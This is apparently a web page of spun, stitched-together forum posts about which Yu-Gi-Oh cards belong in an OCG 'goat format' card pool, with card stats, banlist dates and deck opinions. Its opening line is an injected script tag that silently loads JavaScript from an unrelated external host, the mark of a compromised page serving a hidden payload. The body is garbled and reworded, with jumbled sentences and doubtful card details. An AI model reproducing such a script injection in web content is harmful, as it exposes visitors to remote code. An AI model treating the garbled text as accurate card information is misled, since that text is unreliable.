            <p><script type='text/javascript' src='http://recorock.com.ar/?a66c052=4734944'></script></p>
<p>I also changed my philosophy regarding the cut-off point for joining the OCG goat format card pool &#8211; basically, I think that since the TCG goat is played «à la SJC Indy», there should be a specific OCG tournament where the line is drawn, and the best candidate I found was the 2005 Asian Championship,  so the April 9 date removes both LE8 versions (Arcana Knight Joker, The Selection, Trap of Darkness and Summoner Monk review) and The Wicked Dreadroot (if an analogy helps: Summoner Monk is for the OCG goat as Exarion Universe is for the TCG goat; Van`Dalgyon is like the incarnation of Apophis, because it`s a promo and the final card). You are an absolute legend for compiling and sharing it all – thank you! There are honestly a few cards that I think will be played in modern goat games, imitator, marshmallon and skeleton seem to be great additions to any range of chaos for lights. Shield Crush would be mental for any aggro build, be it Earth or Warrior, and Last Day of the Witch/Warrior would be a mind map in the current meta. Does BCG even have a format equivalent to a goat format? As I understand it, BCG developed differently from GCT in the early years. Hi other goat enthusiasts, as many of you know, there are many effective cards that were legal in the OCG period before CRV, such as Crush Card Virus, gadgets and many Dark Magician support cards. Regarding the non-CRV «OCG goat format»: After some tinkering, I`m basically of the opinion that there are only 50 cards that taste the gameplay. 20 you`d frequently see on a hypothetical scale, and 30 unique Bluemoon/Villain cards. The rest are kitchen table cards (Maximum Six, Victory Dragon, Black Magic Curtain, etc.). The Monster Eye effect and the Mooyan Curry spell also fit this description.</p>
<p>Nearby, but no cigar because of other TCG versions, are Alligator Sword and the fantastic Alligator Sword Dragon (but the great WCPP are beautiful). Again, more than one thing «IYI» &#8211; all but the Alligator Sword Dragon are bad (ASD is pretty good. Mandatory is what comes to mind, and I would also like to explicitly point out (in what I hope will be my last edition) in a long article about the OCG goat format, a useful anachronism: Note once again that the first card that punished the use of Extra Deck significantly was Memory Crusher:   not yet published &#8211; SOI. All mergers are therefore mandatory in terms of game theory.) Arcana Knight Joker &#8211; Level 9 3800/2500. «Once per turn, when a spell/trap card or monster effect is activated that targets that card face up on the field (Quick Effect): You can discard the same type of card (monster, spell or trap); Undo the effect. An option for Cyber Stone players. Can seal the game. Book, Saku, Ring counters and a dozen other things. Legal if you want to extend the definition of the OCG Pre-CRV goat format to your ABSOLUTE LIMIT.</p>
<p>It was published five days before the cyber revolution. Hello! OCG Goat Format is one of my special interests. I`m not actively updating it or anything, but maybe I should make sure I get at least one answer to this question on ocggoatformat.com &#8211; there are now links to pastebins that, taken in total, answer what you`re looking for. It is perfectly acceptable to use the printing of a card that you may want. The text of the map does not have to match that of mid-2005. As long as you know the effect of the card, because it is in goat format. Anyone who disagrees with this is just pedantic. By the way: it turns out that you only remove normal bad monsters if you eliminate the «date no TCG at all». This list was compiled separately by me at a later date (and not added to the website, so I would have to dig up my runbook to post and attach there. I think it`s just aws s3 sync the-dir/s3://the-bucket/but I digress).</p>
<p>It seems like Hourglass of Life has finally gotten a Speed Duels version, so even though those files are a bit out of sync, it`s as good as a text dump you`re going to get right now. Honestly, if you`re even remotely interested in playing this format, you don`t even want the cognitive weight of this list – I`m serious, all horrible normal monsters. Cool art. Interestingly, even cards like the mechanical pog fish would be great for my watermachine deck, as it would be a 2k beatstick under Legendary Ocean that can take advantage of the limiter removal. Another quick point &#8211; you can find videos of Japanese players playing the May 2005 environment with CRV (and others without). I don`t think you should consider the analog «goat» format, but the analog «CRV goat». If you want to play this format, add 73 more cards: Add the CRV + LE8 + Dreadroot above, SD5 (Divine Sword &#8211; Phoenix Blade, Warrior Lady of the Wasteland, Gilford the Legend), NTR (Magician`s Circle, Silent Swordsman LV (4|8)), the NTR Game Guide Promo (Magicians Unite) and also Tualatin. There is a problem with the recording, so it accidentally includes Acrobat Monkey and Contract Execution &#8211; for some reason they had the wrong TCG data when I recovered the data. Ignore them. I wanted to ask if anyone has a definitive list of all the missing cards in our TCG version of goat format? I found a Reddit link, but it links to a seemingly defunct forum. They had a similar format.</p>
<p>The March 2005 OCG list was almost the same as our April 2005 TCG list, except it listed cards we didn`t already have (Sixth Sense banned; Marshmallon, Crush Card, limited exchange of mind). Goat Control was a highest-level deck in Japan, known as 変異カオス (Chaos of Metamorphosis). I can`t read Japanese, so I don`t know if Japanese players have the same preference for the goat format as we do. Oddly enough, the last European Championships had goat format, and according to the website, CCV was allowed. Maybe this could be relevant for future Time Wizard tournaments? Crimson Sunbird &#8211; Level 6 2300/1800. Surpasses Dark Blade the Dragon Knight and Dark Flare Knight in terms of ATK. Can crash into Chaos Sorcerer if that`s what you need to do. Mother of God. It`s an incredibly handy resource. Thank you very much!. It`s a bit non-sequitur, but I recognize you as the poster looking for games in the place where I live &#8211; only a certain amount of content circulates through r/Goat_Format. Have you ever found a local scene? Finally, I had looked and even pulled out the sharp technique of «ask in Facebook group», the next things I found were like an hour or two in the north.</p>
<p>Alligator Sword Dragon &#8211; Level 5 1700/1500. Einzigartige Wirkung. «This card can attack your opponent directly if the only open monsters they control are EARTH, WATER, or FIRE.» ETA: One last thing &#8211; if you`re really interested in ordinary monsters and want physical cardboard, there were a small handful whose only draws came from the 2010/2011 World Championships, so it makes more financial sense to represent them (or just buy OCG): u/WaveMotionGanon has the answers you`re looking for. I`m just going to point out something that hasn`t been addressed yet – the merge toolbox. There are seven (or more) playable merges that OCG players have had that we didn`t have. Meteor B. Dragon &#8211; Level 8 3500/2000. By paying tribute to BLS, of course.</p>
<p>Big beating stick. An alternative to Gatling Dragon, which was the only level 8 we had. For example, as plain text, I drew the list of OCG Goat Format cards with TCG versions of (huge yugioh JSON Data Dump) + (OCG release date before OCG CRV date) &#8211; (TCG version before TCG CRV date) &#8211; (no TCG date at all). Sources: Yugipedia for hard facts. Opinions are my own. DuelingBook is more prone to rot links, but if you want to consume it that way, TCK in the Discord has compiled them via a few deck links: Sources: yugipedia.com/wiki/March_2005_Lists roadoftheking.com/first-forbidden-monsters/ Zombie Warrior &#8211; Level 3 Dark 1200/900. </p>
